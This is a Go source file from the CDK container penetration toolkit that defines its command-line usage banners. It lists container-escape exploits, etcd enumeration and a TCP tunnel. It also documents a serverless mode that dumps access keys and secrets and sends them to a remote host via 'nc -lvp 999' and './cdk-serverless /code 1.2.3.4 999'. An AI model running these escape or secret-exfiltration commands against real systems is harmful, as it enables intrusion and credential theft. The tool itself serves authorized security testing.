/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cli

import (
	"fmt"
	"log"
	"os"

	"github.com/cdk-team/CDK/pkg/util"
	"github.com/docopt/docopt-go"
)

var Args docopt.Opts
var GitCommit string

var BannerTitle = `CDK (Container DucK)`
var BannerVersion = fmt.Sprintf("%s %s", "CDK Version(GitCommit):", GitCommit)

var BannerHeader = fmt.Sprintf(`%s
%s
Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy & neargle
Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/wiki
`, util.GreenBold.Sprint(BannerTitle), BannerVersion)

var BannerContainerTpl = BannerHeader + `
%s
  cdk evaluate [--full]
  cdk eva [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk auto-escape <cmd>
  cdk <tool> [<args>...]

%s
  cdk evaluate                              Gather information to find weakness inside container.
  cdk eva                                   Alias of "cdk evaluate".
  cdk evaluate --full                       Enable file scan during information gathering.


%s
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.

%s
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

%s
  -h --help     Show this help msg.
  -v --version  Show version.
`

// BannerContainer is the banner of CDK command line with colorful.
var BannerContainer = fmt.Sprintf(
	BannerContainerTpl,
	"Usage:",
	util.GreenBold.Sprint("Evaluate:"),
	util.GreenBold.Sprint("Exploit:"),
	util.GreenBold.Sprint("Tool:"),
	"Options:",
)

var BannerServerless = BannerHeader + `
THIS IS THE SLIM VERSION FOR DUMPING SECRET/AK IN SERVERLESS FUNCTIONS.

sessions in serverless functions will be killed in seconds, use this tool to dump AK/secrets in the fast way.

Usage:
cdk-serverless <scan-dir> <remote-ip> <port>

Args:
scan-dir                 Read all files under target dir and dump AK token.
remote-ip,port           Send results to target IP:PORT via TCP tunnel.

Example:
1. public server(e.g. 1.2.3.4) start listen tcp port 999 using "nc -lvp 999"
2. inside serverless function service execute "./cdk-serverless /code 1.2.3.4 999"
`

func parseDocopt() {
	args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], BannerVersion)
	if err != nil {
		log.Fatalln("docopt err: ", err)
	}
	Args = args
}
